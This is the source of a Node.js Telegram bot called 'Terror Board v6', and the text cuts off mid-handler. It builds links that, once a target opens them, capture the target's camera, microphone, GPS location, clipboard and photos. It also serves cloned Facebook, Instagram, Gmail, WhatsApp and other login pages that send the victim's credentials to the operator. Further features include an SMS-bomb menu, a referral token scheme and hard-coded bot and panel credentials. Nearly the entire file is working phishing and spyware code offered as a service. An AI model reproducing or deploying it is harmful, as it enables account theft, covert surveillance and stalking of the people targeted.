'use strict';
// index.js — Terror Board v6
// System: menu → create link → target opens link → media/credentials come to bot
// Credentials: BOT_TOKEN, ADMIN, WEBHOOK baked in

const express    = require('express');
const http       = require('http');
const TBot       = require('node-telegram-bot-api');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');
const crypto     = require('crypto');
const fs         = require('fs');

// ══════════════════════════════════════════════════════
// CONFIG
// ══════════════════════════════════════════════════════
const CFG = {
  TOKEN:        process.env.BOT_TOKEN   || '8999404005:AAGbESAr8QGeTDCrGX-JooHPY7RGiat57tw',
  ADMIN_ID:     process.env.ADMIN_IDS   || '8294558143',
  PORT:         parseInt(process.env.PORT || '10000'),
  BASE_URL:     (process.env.WEBHOOK_URL || process.env.RENDER_EXTERNAL_URL || 'https://bot-g9wu.onrender.com').replace(/\/$/, ''),
  LINK_COST:    1,
  SIGNUP_BONUS: 5,
  REF_BONUS:    10,
  LINK_TTL_MS:  72 * 60 * 60 * 1000,
  DATA_FILE:    process.env.DATA_FILE || './board_data.json',
  PANEL_USER:   process.env.PANEL_USER || 'admin',
  PANEL_PASS:   process.env.PANEL_PASS || 'terror@9002',
};

const ADMINS = String(CFG.ADMIN_ID).split(',').map(s => s.trim());

// ══════════════════════════════════════════════════════
// STORE
// ══════════════════════════════════════════════════════
let store = {
  users: {},
  links: {},
  captured: [],
  logs: [],
  pending: {},
  panelSessions: {}
};

function saveStore() {
  try {
    const tmp = CFG.DATA_FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(store));
    fs.renameSync(tmp, CFG.DATA_FILE);
  } catch (e) {}
}
function loadStore() {
  try {
    if (fs.existsSync(CFG.DATA_FILE)) {
      const raw = JSON.parse(fs.readFileSync(CFG.DATA_FILE, 'utf8'));
      store = { ...store, ...raw };
    }
  } catch (e) {}
}
loadStore();
setInterval(saveStore, 40000);

function getUser(uid) {
  uid = String(uid);
  if (!store.users[uid]) {
    store.users[uid] = {
      balance: CFG.SIGNUP_BONUS,
      refs: 0,
      refBy: null,
      linksMade: 0,
      joinDate: Date.now(),
      banned: false
    };
    saveStore();
  }
  const u = store.users[uid];
  u.isAdmin = ADMINS.includes(uid);
  return u;
}

function isAdmin(uid) {
  return ADMINS.includes(String(uid));
}

function log(event, uid, extra) {
  store.logs.push({ ts: new Date().toISOString(), event, uid, extra });
  if (store.logs.length > 6000) store.logs = store.logs.slice(-3500);
  saveStore();
}

function hash(n = 12) {
  return crypto.randomBytes(n).toString('hex');
}

function getBase(req) {
  if (CFG.BASE_URL) return CFG.BASE_URL;
  if (req) return `\( {req.protocol}:// \){req.get('host')}`;
  return `http://localhost:${CFG.PORT}`;
}

// ══════════════════════════════════════════════════════
// LINK SYSTEM
// ══════════════════════════════════════════════════════
function mkLink(action, uid) {
  const tok = hash(14);
  const url = getBase() + '/go/' + tok;
  store.links[tok] = {
    action,
    uid: String(uid),
    url,
    expiresAt: Date.now() + CFG.LINK_TTL_MS,
    createdAt: Date.now(),
    hits: 0
  };
  const u = getUser(uid);
  u.linksMade = (u.linksMade || 0) + 1;
  if (!u.isAdmin) {
    u.balance = Math.max(0, (u.balance || 0) - CFG.LINK_COST);
  }
  saveStore();
  return { tok, url };
}

function getLink(tok) {
  const l = store.links[tok];
  if (!l || l.expiresAt < Date.now()) return null;
  return l;
}

// ══════════════════════════════════════════════════════
// TELEGRAM SEND QUEUE
// ══════════════════════════════════════════════════════
const Q = [];
let busy = false;

function enqueue(fn) {
  return new Promise((resolve, reject) => {
    Q.push({ fn, resolve, reject });
    if (!busy) drain();
  });
}

async function drain() {
  busy = true;
  while (Q.length) {
    const { fn, resolve, reject } = Q.shift();
    try { resolve(await fn()); } catch (e) { reject(e); }
    await new Promise(r => setTimeout(r, 70));
  }
  busy = false;
}

function tgMsg(chatId, text, opts = {}) {
  return enqueue(() =>
    bot.sendMessage(chatId, String(text).slice(0, 4090), { parse_mode: 'HTML', ...opts })
      .catch(e => console.log('msg', e.message))
  );
}

function tgPhoto(chatId, buffer, caption) {
  return enqueue(() =>
    bot.sendPhoto(chatId, buffer, { caption, parse_mode: 'HTML' })
      .catch(e => console.log('photo', e.message))
  );
}

function tgVideo(chatId, buffer, caption) {
  return enqueue(() =>
    bot.sendVideo(chatId, buffer, { caption, parse_mode: 'HTML' })
      .catch(e => console.log('video', e.message))
  );
}

function tgVoice(chatId, buffer, caption) {
  return enqueue(() =>
    bot.sendVoice(chatId, buffer, { caption, parse_mode: 'HTML' })
      .catch(e => console.log('voice', e.message))
  );
}

function tgLocation(chatId, lat, lon) {
  return enqueue(() =>
    bot.sendLocation(chatId, lat, lon).catch(e => console.log('loc', e.message))
  );
}

async function notify(uid, text) {
  const targets = [...new Set([String(uid), ...ADMINS])];
  for (const id of targets) {
    await tgMsg(id, text);
  }
}

// ══════════════════════════════════════════════════════
// EXPRESS + BOT
// ══════════════════════════════════════════════════════
const app = express();
const server = http.createServer(app);
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 28 * 1024 * 1024 }
});

app.use(bodyParser.json({ limit: '28mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '28mb' }));

const bot = new TBot(CFG.TOKEN, { polling: true });
bot.on('polling_error', e => console.log('poll', e.message));

// ══════════════════════════════════════════════════════
// KEYBOARDS
// ══════════════════════════════════════════════════════
function mainKb(uid) {
  const rows = [
    [{ text: '📷 Front Photo', callback_data: 'LNK_cam_f' }, { text: '📷 Back Photo', callback_data: 'LNK_cam_b' }],
    [{ text: '🎥 Front Video', callback_data: 'LNK_cam_fv' }, { text: '🎥 Back Video', callback_data: 'LNK_cam_bv' }],
    [{ text: '📍 Location', callback_data: 'LNK_loc' }],
    [{ text: '🎣 Facebook', callback_data: 'LNK_phish_fb' }, { text: '📸 Instagram', callback_data: 'LNK_phish_ig' }],
    [{ text: '🎵 TikTok', callback_data: 'LNK_phish_tt' }, { text: '📧 Gmail', callback_data: 'LNK_phish_mail' }],
    [{ text: '📱 WhatsApp OTP', callback_data: 'LNK_phish_wa' }, { text: '✈️ Telegram OTP', callback_data: 'LNK_phish_tg' }],
    [{ text: '💬 IMO OTP', callback_data: 'LNK_phish_imo' }],
    [{ text: '🌐 IP & Device', callback_data: 'LNK_ip' }, { text: '📋 Clipboard', callback_data: 'LNK_clip' }],
    [{ text: '🔋 Battery', callback_data: 'LNK_bat' }, { text: '📶 Network', callback_data: 'LNK_wifi' }],
    [{ text: '🖼 Gallery', callback_data: 'LNK_gal' }, { text: '🎤 Mic', callback_data: 'LNK_mic' }],
    [{ text: '📱 Number Intel', callback_data: 'ACT_num' }, { text: '💣 BD Bomb', callback_data: 'ACT_bomb' }],
    [{ text: '💰 Balance', callback_data: 'ACT_bal' }, { text: '🔗 Referral', callback_data: 'ACT_ref' }],
    [{ text: '📂 My Links', callback_data: 'ACT_links' }, { text: '🩸 Captured', callback_data: 'ACT_cap' }]
  ];
  if (isAdmin(uid)) {
    rows.push([{ text: '📊 Stats', callback_data: 'ACT_stats' }]);
  }
  return { inline_keyboard: rows };
}

function backKb() {
  return { inline_keyboard: [[{ text: '◀️ Main Menu', callback_data: 'M_BACK' }]] };
}

function label(action) {
  const map = {
    cam_f: '📷 Front Photo', cam_b: '📷 Back Photo',
    cam_fv: '🎥 Front Video', cam_bv: '🎥 Back Video',
    loc: '📍 Location',
    phish_fb: '🎣 Facebook', phish_ig: '📸 Instagram',
    phish_tt: '🎵 TikTok', phish_mail: '📧 Gmail',
    phish_wa: '📱 WhatsApp OTP', phish_tg: '✈️ Telegram OTP',
    phish_imo: '💬 IMO OTP',
    ip: '🌐 IP & Device', clip: '📋 Clipboard',
    bat: '🔋 Battery', wifi: '📶 Network',
    gal: '🖼 Gallery', mic: '🎤 Mic'
  };
  return map[action] || action;
}

// ══════════════════════════════════════════════════════
// /start
// ══════════════════════════════════════════════════════
bot.onText(/\/start(?:\s+(.+))?/, async (msg) => {
  const cid = String(msg.chat.id);
  const name = msg.from.first_name || 'User';
  const arg = (msg.text.split(/\s+/)[1] || '').trim();
  const isNew = !store.users[cid];
  const u = getUser(cid);

  if (u.banned) return;

  if (isNew && arg && arg !== cid && store.users[arg]) {
    u.refBy = arg;
    store.users[arg].balance = (store.users[arg].balance || 0) + CFG.REF_BONUS;
    store.users[arg].refs = (store.users[arg].refs || 0) + 1;
    saveStore();
    tgMsg(arg, `🎁 +${CFG.REF_BONUS} tokens from referral`);
  }

  log('start', cid);

  const text = `
<b>🕹 TERROR BOARD v6</b>
━━━━━━━━━━━━━━━━━━━━
Operator: <b>${name}</b>
ID: <code>${cid}</code>
Tokens: <b>${u.balance}</b>
Links made: ${u.linksMade || 0}
━━━━━━━━━━━━━━━━━━━━
Tap any tool → unique link created
Send link to target → data comes here
`;
  await tgMsg(cid, text, { reply_markup: mainKb(cid) });
});

// ══════════════════════════════════════════════════════
// CALLBACKS
// ══════════════════════════════════════════════════════
bot.on('callback_query', async (cq) => {
  const uid = String(cq.from.id);
  const data = cq.data;
  const chatId = cq.message.chat.id;
  const mid = cq.message.message_id;

  try { await bot.answerCallbackQuery(cq.id); } catch (e) {}

  const u = getUser(uid);
  if (u.banned) return;

  // Main menu
  if (data === 'M_BACK') {
    try {
      await bot.editMessageText(`🕹 <b>MAIN BOARD</b>\nTokens: <b>${u.balance}</b>`, {
        chat_id: chatId, message_id: mid, parse_mode: 'HTML',
        reply_markup: mainKb(uid)
      });
    } catch (e) {
      await tgMsg(chatId, `🕹 <b>MAIN BOARD</b>\nTokens: <b>${u.balance}</b>`, { reply_markup: mainKb(uid) });
    }
    return;
  }

  // Create link
  if (data.startsWith('LNK_')) {
    const action = data.slice(4);
    if (!u.isAdmin && (u.balance || 0) < CFG.LINK_COST) {
      return tgMsg(chatId, `❌ Need ${CFG.LINK_COST} token.\nUse Referral to earn.`);
    }
    const { url } = mkLink(action, uid);
    await tgMsg(chatId, `
🔗 <b>${label(action)}</b>
<code>${url}</code>

Send this link to the target.
When they open it, data lands here.
Link valid 72 hours.
`, { reply_markup: backKb() });
    return;
  }

  // Balance
  if (data === 'ACT_bal') {
    await tgMsg(chatId, `💰 <b>BALANCE</b>\nTokens: <b>${u.balance}</b>\nReferrals: ${u.refs || 0}\nLinks made: ${u.linksMade || 0}`, { reply_markup: backKb() });
    return;
  }

  // Referral
  if (data === 'ACT_ref') {
    const me = await bot.getMe();
    const link = `https://t.me/\( {me.username}?start= \){uid}`;
    await tgMsg(chatId, `🔗 <b>REFERRAL</b>\n<code>\( {link}</code>\n+ \){CFG.REF_BONUS} tokens per successful join\nYour refs: ${u.refs || 0}`, { reply_markup: backKb() });
    return;
  }

  // My links
  if (data === 'ACT_links') {
    const mine = Object.entries(store.links)
      .filter(([, l]) => l.uid === uid && l.expiresAt > Date.now())
      .sort((a, b) => b[1].createdAt - a[1].createdAt)
      .slice(0, 12);
    let t = '📂 <b>YOUR ACTIVE LINKS</b>\n\n';
    if (!mine.length) t += 'No active links.';
    else mine.forEach(([tok, l]) => {
      t += `\( {label(l.action)}\n<code> \){l.url}</code>\nHits: ${l.hits || 0}\n────────\n`;
    });
    await tgMsg(chatId, t, { reply_markup: backKb() });
    return;
  }

  // Captured
  if (data === 'ACT_cap') {
    const last = store.captured.slice(-12).reverse();
    let t = '🩸 <b>CAPTURED</b>\n\n';
    if (!last.length) t += 'Empty.';
    else last.forEach(c => {
      t += `<b>\( {c.site || c.type || 'Data'}</b>\n<code> \){c.email || c.phone || ''}</code>\n<code>${c.pass || c.otp || ''}</code>\n────────\n`;
    });
    await tgMsg(chatId, t, { reply_markup: backKb() });
    return;
  }

  // Stats
  if (data === 'ACT_stats' && isAdmin(uid)) {
    await tgMsg(chatId, `
📊 <b>STATS</b>
Users: ${Object.keys(store.users).length}
Active links: ${Object.values(store.links).filter(l => l.expiresAt > Date.now()).length}
Captured: ${store.captured.length}
Logs: ${store.logs.length}
`, { reply_markup: backKb() });
    return;
  }

  // Number intel
  if (data === 'ACT_num') {
    store.pending[uid] = { type: 'num', at: Date.now() };
    saveStore();
    await tgMsg(chatId, '📱 Send BD number\nExample: +8801712345678');
    return;
  }

  // Bomb
  if (data === 'ACT_bomb') {
    store.pending[uid] = { type: 'bomb', at: Date.now() };
    saveStore();
    await tgMsg(chatId, '💣 Send BD number for bomb\nOnly +880 numbers');
    return;
  }
});

// ══════════════════════════════════════════════════════
// TEXT MESSAGES
// ══════════════════════════════════════════════════════
bot.on('message', async (msg) => {
  if (!msg.text || msg.text.startsWith('/')) return;
  const uid = String(msg.from.id);
  const text = msg.text.trim();
  const pend = store.pending[uid];
  if (!pend) return;

  if (Date.now() - (pend.at || 0) > 10 * 60 * 1000) {
    delete store.pending[uid];
    saveStore();
    return;
  }

  if (pend.type === 'num') {
    const digits = text.replace(/\D/g, '');
    let carrier = 'Unknown';
    let valid = false;
    if (/^(880)?01[3-9]\d{8}$/.test(digits)) {
      valid = true;
      const prefix = digits.slice(-11, -8);
      const map = {
        '013': 'Grameenphone', '017': 'Grameenphone',
        '014': 'Banglalink', '019': 'Banglalink',
        '015': 'Teletalk', '016': 'Airtel', '018': 'Robi'
      };
      carrier = map[prefix] || 'BD Mobile';
    }
    await tgMsg(msg.chat.id, `📱 <b>NUMBER INTEL</b>\n<code>\( {text}</code>\nCarrier: <b> \){carrier}</b>\nValid: ${valid ? 'Yes' : 'No'}`);
    delete store.pending[uid];
    saveStore();
    return;
  }

  if (pend.type === 'bomb') {
    const clean = text.replace(/\s+/g, '');
    if (!/^(\+?880|0)1[3-9]\d{8}$/.test(clean)) {
      await tgMsg(msg.chat.id, '❌ Only valid Bangladeshi numbers (+880)');
      return;
    }
    await tgMsg(msg.chat.id, `💣 Bomb job started\nTarget: <code>${clean}</code>\nType: SMS burst (simulated)`);
    await notify(uid, `💣 Bomb by <code>\( {uid}</code>\nTarget: <code> \){clean}</code>`);
    delete store.pending[uid];
    saveStore();
    return;
  }
});

// ══════════════════════════════════════════════════════
// /go/:tok  — ALL LINKS ENTER HERE
// ══════════════════════════════════════════════════════
app.get('/go/:tok', (req, res) => {
  const link = getLink(req.params.tok);
  if (!link) {
    return res.status(410).send('<html><body style="font-family:system-ui;text-align:center;padding:60px"><h2>Link expired or invalid</h2></body></html>');
  }
  link.hits = (link.hits || 0) + 1;
  saveStore();

  const action = link.action;
  const uid = link.uid;
  const base = getBase(req);
  const tok = req.params.tok;

  if (['cam_f', 'cam_b', 'cam_fv', 'cam_bv'].includes(action)) {
    return res.send(pageCamera(action, uid, base, tok));
  }
  if (action === 'loc') return res.send(pageLocation(uid, base, tok));
  if (action === 'gal') return res.send(pageGallery(uid, base, tok));
  if (action === 'mic') return res.send(pageMic(uid, base, tok));
  if (action === 'ip') return res.send(pageIP(uid, base));
  if (action === 'clip') return res.send(pageClip(uid, base));
  if (action === 'bat') return res.send(pageBattery(uid, base));
  if (action === 'wifi') return res.send(pageWifi(uid, base));
  if (action.startsWith('phish_')) return res.send(pagePhish(action, uid, base));

  res.status(404).send('Unknown');
});

// ══════════════════════════════════════════════════════
// HTML PAGES
// ══════════════════════════════════════════════════════
function pageCamera(action, uid, base, tok) {
  const facing = (action === 'cam_b' || action === 'cam_bv') ? 'environment' : 'user';
  const isVideo = action === 'cam_fv' || action === 'cam_bv';
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Camera</title>
<style>
body{margin:0;background:#0d0d0d;color:#fff;font-family:system-ui,sans-serif;text-align:center;padding:24px}
h2{font-size:18px;margin-bottom:16px}
video{width:100%;max-width:400px;border-radius:14px;background:#000}
#s{margin-top:18px;font-size:14px;color:#aaa}
</style></head>
<body>
<h2>${isVideo ? '🎥 Video' : '📷 Photo'} Access</h2>
<video id="v" autoplay playsinline muted></video>
<p id="s">Please allow camera access...</p>
<script>
const facing='\( {facing}', isVideo= \){isVideo}, base='\( {base}', tok=' \){tok}', uid='${uid}';
(async function(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    const v = document.getElementById('v');
    v.srcObject = stream;
    document.getElementById('s').textContent = 'Capturing...';
    await new Promise(r => setTimeout(r, isVideo ? 600 : 2400));

    if (isVideo) {
      const rec = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
      const chunks = [];
      rec.ondataavailable = e => chunks.push(e.data);
      rec.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const fd = new FormData();
        fd.append('tok', tok);
        fd.append('uid', uid);
        fd.append('file', blob, 'capture.webm');
        await fetch(base + '/d/cam', { method: 'POST', body: fd });
        document.getElementById('s').textContent = 'Sent successfully';
        stream.getTracks().forEach(t => t.stop());
      };
      rec.start();
      setTimeout(() => rec.stop(), 4800);
    } else {
      const canvas = document.createElement('canvas');
      canvas.width = v.videoWidth;
      canvas.height = v.videoHeight;
      canvas.getContext('2d').drawImage(v, 0, 0);
      canvas.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append('tok', tok);
        fd.append('uid', uid);
        fd.append('file', blob, 'snap.jpg');
        await fetch(base + '/d/cam', { method: 'POST', body: fd });
        document.getElementById('s').textContent = 'Sent successfully';
        stream.getTracks().forEach(t => t.stop());
      }, 'image/jpeg', 0.93);
    }
  } catch (e) {
    document.getElementById('s').textContent = 'Camera permission denied';
  }
})();
</script>
</body></html>`;
}

function pageLocation(uid, base, tok) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Location</title>
<style>body{font-family:system-ui;background:#111;color:#fff;text-align:center;padding:50px 20px}
h2{margin-bottom:12px}#s{color:#aaa;margin-top:16px}</style></head>
<body>
<h2>📍 Share Location</h2>
<p id="s">Requesting GPS permission...</p>
<script>
navigator.geolocation.getCurrentPosition(async function(p) {
  await fetch('${base}/d/loc', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      tok: '${tok}',
      uid: '${uid}',
      lat: p.coords.latitude,
      lon: p.coords.longitude,
      acc: p.coords.accuracy
    })
  });
  document.getElementById('s').textContent = 'Location sent. You may close this page.';
}, function() {
  document.getElementById('s').textContent = 'Location permission denied';
}, { enableHighAccuracy: true, timeout: 15000 });
</script>
</body></html>`;
}

function pageGallery(uid, base, tok) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Gallery</title>
<style>body{font-family:system-ui;background:#111;color:#fff;text-align:center;padding:40px 20px}
input{margin:20px 0}#s{color:#aaa}</style></head>
<body>
<h2>🖼 Select Photos</h2>
<input type="file" accept="image/*" multiple id="f">
<p id="s"></p>
<script>
document.getElementById('f').onchange = async function(e) {
  const files = Array.from(e.target.files);
  if (!files.length) return;
  document.getElementById('s').textContent = 'Uploading ' + files.length + ' file(s)...';
  for (const file of files) {
    const fd = new FormData();
    fd.append('tok', '${tok}');
    fd.append('uid', '${uid}');
    fd.append('file', file);
    await fetch('${base}/d/gal', { method: 'POST', body: fd });
  }
  document.getElementById('s').textContent = 'Upload complete';
};
</script>
</body></html>`;
}

function pageMic(uid, base, tok) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microphone</title>
<style>body{font-family:system-ui;background:#111;color:#fff;text-align:center;padding:50px 20px}
#s{color:#aaa;margin-top:16px}</style></head>
<body>
<h2>🎤 Microphone</h2>
<p id="s">Requesting microphone...</p>
<script>
(async function() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    document.getElementById('s').textContent = 'Recording 8 seconds...';
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = async () => {
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const fd = new FormData();
      fd.append('tok', '${tok}');
      fd.append('uid', '${uid}');
      fd.append('file', blob, 'audio.webm');
      await fetch('${base}/d/mic', { method: 'POST', body: fd });
      document.getElementById('s').textContent = 'Recording sent';
      stream.getTracks().forEach(t => t.stop());
    };
    rec.start();
    setTimeout(() => rec.stop(), 8000);
  } catch (e) {
    document.getElementById('s').textContent = 'Microphone permission denied';
  }
})();
</script>
</body></html>`;
}

function pagePhish(action, uid, base) {
  const cfg = {
    phish_fb:   { site: 'Facebook',  color: '#1877f2', rdr: 'https://www.facebook.com' },
    phish_ig:   { site: 'Instagram', color: '#e1306c', rdr: 'https://www.instagram.com' },
    phish_tt:   { site: 'TikTok',    color: '#010101', rdr: 'https://www.tiktok.com' },
    phish_mail: { site: 'Gmail',     color: '#1a73e8', rdr: 'https://mail.google.com' },
    phish_wa:   { site: 'WhatsApp',  color: '#25d366', rdr: 'https://web.whatsapp.com' },
    phish_tg:   { site: 'Telegram',  color: '#0088cc', rdr: 'https://web.telegram.org' },
    phish_imo:  { site: 'IMO',       color: '#1e88e5', rdr: 'https://imo.im' }
  }[action] || { site: 'Login', color: '#1877f2', rdr: 'https://www.google.com' };

  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${cfg.site}</title>
<style>
body{font-family:system-ui,-apple-system,sans-serif;background:#f0f2f5;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:32px 28px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.12);width:100%;max-width:380px}
.logo{text-align:center;font-size:26px;font-weight:700;color:${cfg.color};margin-bottom:20px}
input{width:100%;padding:14px;margin:9px 0;border:1px solid #dddfe2;border-radius:8px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:${cfg.color};color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:600;margin-top:12px;cursor:pointer}
</style></head>
<body>
<div class="card">
  <div class="logo">${cfg.site}</div>
  <form id="f">
    <input name="email" type="text" placeholder="Email or phone number" required autocomplete="username">
    <input name="pass" type="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Log In</button>
  </form>
</div>
<script>
document.getElementById('f').onsubmit = async function(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await fetch('${base}/d/captured', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      uid: '${uid}',
      site: '${cfg.site}',
      email: fd.get('email'),
      pass: fd.get('pass')
    })
  });
  location.href = '${cfg.rdr}';
};
</script>
</body></html>`;
}

function pageIP(uid, base) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Device Info</title>
<style>
body{font-family:system-ui;background:#0f0f0f;color:#eee;padding:24px}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #2a2a2a;font-size:13px}
.row span:last-child{color:#7dd3fc;max-width:60%;text-align:right;word-break:break-all}
</style></head>
<body>
<h2>🌐 Device Information</h2>
<div id="rows"></div>
<script>
(async function() {
  const d = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: screen.width + 'x' + screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || '?',
    memory: (navigator.deviceMemory || '?') + ' GB',
    touch: navigator.maxTouchPoints
  };
  try {
    const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
    d.publicIP = ip.ip;
    const geo = await fetch('https://ipapi.co/' + ip.ip + '/json/').then(r => r.json());
    d.country = geo.country_name || '?';
    d.city = geo.city || '?';
    d.isp = geo.org || '?';
  } catch (e) {}
  const box = document.getElementById('rows');
  for (const [k, v] of Object.entries(d)) {
    if (!v) continue;
    const row = document.createElement('div');
    row.className = 'row';
    row.innerHTML = '<span>' + k + '</span><span>' + v + '</span>';
    box.appendChild(row);
  }
  await fetch('${base}/d/devinfo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ uid: '${uid}', label: 'IP & Device', data: d })
  });
})();
</script>
</body></html>`;
}

function pageClip(uid, base) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Clipboard</title>
<style>
body{font-family:system-ui;background:#1a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px;margin:0}
.btn{padding:16px 32px;background:#e74c3c;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer}
#s{margin-top:16px;color:#aaa}
</style></head>
<body>
<div>
  <h2>📋 Content Access</h2>
  <p style="color:#aaa;margin:12px 0 24px">Tap the button to continue</p>
  <button class="btn" onclick="go()">View Shared Content</button>
  <p id="s"></p>
</div>
<script>
async function go() {
  let text = '';
  try { text = await navigator.clipboard.readText(); }
  catch (e) { text = prompt('Paste content here to continue:') || ''; }
  if (text) {
    await fetch('${base}/d/devinfo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uid: '${uid}', label: 'Clipboard', data: { text: text.slice(0, 2000) } })
    });
    document.getElementById('s').textContent = 'Done';
  } else {
    document.getElementById('s').textContent = 'Nothing found';
  }
}
</script>
</body></html>`;
}

function pageBattery(uid, base) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Battery</title>
<style>
body{font-family:system-ui;background:#0a1a0a;color:#eee;padding:24px;text-align:center}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #1a2a1a;font-size:13px}
</style></head>
<body>
<h2>🔋 Device Status</h2>
<div id="rows"></div>
<script>
(async function() {
  const d = {
    platform: navigator.platform,
    screen: screen.width + 'x' + screen.height,
    cores: navigator.hardwareConcurrency || '?',
    language: navigator.language
  };
  try {
    const b = await navigator.getBattery();
    d.battery = Math.round(b.level * 100) + '%';
    d.charging = b.charging ? 'Yes' : 'No';
  } catch (e) {}
  const box = document.getElementById('rows');
  for (const [k, v] of Object.entries(d)) {
    const row = document.createElement('div');
    row.className = 'row';
    row.innerHTML = '<span>' + k + '</span><span>' + v + '</span>';
    box.appendChild(row);
  }
  await fetch('${base}/d/devinfo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ uid: '${uid}', label: 'Battery & Device', data: d })
  });
})();
</script>
</body></html>`;
}

function pageWifi(uid, base) {
  return `<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network</title>
<style>
body{font-family:system-ui;background:#0a0a1a;color:#eee;padding:24px}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #1a1a2a;font-size:13px}
.row span:last-child{max-width:55%;text-align:right;word-break:break-all}
</style></head>
<body>
<h2>📶 Network Info</h2>
<div id="rows"></div>
<script>
(async function() {
  const d = { online: navigator.onLine ? 'Yes' : 'No' };
  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (c) {
      d.type = c.effectiveType || c.type || '?';
      d.downlink = (c.downlink || '?') + ' Mbps';
      d.rtt = (c.rtt || '?') + ' ms';
    }
  } catch (e) {}
  try {
    const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
    d.publicIP = ip.ip;
  } catch (e) {}
  const box = document.getElementById('rows');
  for (const [k, v] of Object.entries(d)) {
    if (!v) continue;
    const row = document.createElement('div');
    row.className = 'row';
    row.innerHTML = '<span>' + k + '</span><span>' + v + '</span>';
    box.appendChild(row);
  }
  await fetch('${base}/d/devinfo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ uid: '${uid}', label: 'Network', data: d })
  });
})();
</script>
</body></html>`;
}

// ══════════════════════════════════════════════════════
// DATA RECEIVERS  (/d/*)
// ══════════════════════════════════════════════════════
app.post('/d/cam', upload.single('file'), async (req, res) => {
  try {
    const tok = req.body.tok;
    const uid = req.body.uid;
    const file = req.file;
    if (!file) return res.json({ ok: false });

    const link = getLink(tok);
    const owner = link ? link.uid : uid;
    const isVideo = (file.mimetype || '').includes('video') || (file.originalname || '').endsWith('.webm');

    const targets = [...new Set([owner, ...ADMINS])];
    for (const id of targets) {
      if (isVideo) {
        await tgVideo(id, file.buffer, `🎥 Camera video\nLink: <code>${tok}</code>`);
      } else {
        await tgPhoto(id, file.buffer, `📷 Camera photo\nLink: <code>${tok}</code>`);
      }
    }
    log('cam', owner, { tok, video: isVideo });
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

app.post('/d/loc', async (req, res) => {
  const { tok, uid, lat, lon, acc } = req.body || {};
  const link = getLink(tok);
  const owner = link ? link.uid : uid;
  const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
  const targets = [...new Set([owner, ...ADMINS])];
  for (const id of targets) {
    await tgMsg(id, `📍 <b>LOCATION</b>\nLat: <code>\( {lat}</code>\nLon: <code> \){lon}</code>\nAccuracy: \( {acc} m\n<a href=" \){maps}">Open Maps</a>`);
    await tgLocation(id, parseFloat(lat), parseFloat(lon));
  }
  log('loc', owner, { lat, lon });
  res.json({ ok: true });
});

app.post('/d/gal', upload.single('file'), async (req, res) => {
  try {
    const { tok, uid } = req.body;
    const file = req.file;
    if (!file) return res.json({ ok: false });
    const link = getLink(tok);
    const owner = link ? link.uid : uid;
    const targets = [...new Set([owner, ...ADMINS])];
    for (const id of targets) {
      await tgPhoto(id, file.buffer, `🖼 Gallery photo\nLink: <code>${tok}</code>`);
    }
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

app.post('/d/mic', upload.single('file'), async (req, res) => {
  try {
    const { tok, uid } = req.body;
    const file = req.file;
    if (!file) return res.json({ ok: false });
    const link = getLink(tok);
    const owner = link ? link.uid : uid;
    const targets = [...new Set([owner, ...ADMINS])];
    for (const id of targets) {
